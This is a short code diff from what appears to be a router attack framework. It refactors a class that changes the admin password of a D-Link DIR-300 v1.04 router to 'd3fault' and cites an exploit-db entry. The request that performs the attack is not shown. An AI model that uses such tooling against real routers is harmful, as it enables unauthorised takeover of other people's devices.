@@ -2,14 +2,14 @@ import util
 import urllib
 from ..router_vuln import RouterVuln
 
-__router__ = 'DIR-300 v1.04'
-__vuln__='Change Admin Password'
-class AddAdmin(RouterVuln):
+class add_admin_300(RouterVuln):
 	"""Modify the default admin password to 'd3fault'
 	   http://www.exploit-db.com/exploits/15753/
 	"""
 	def __init__(self):
-		super(AddAdmin,self).__init__()
+		self.router = 'DIR-300 v1.04'
+		self.vuln   = 'Change Admin Password'
+		super(add_admin_300,self).__init__()
 
 	def run(self):
 		util.Msg('Changing admin password to \'d3fault\'...')
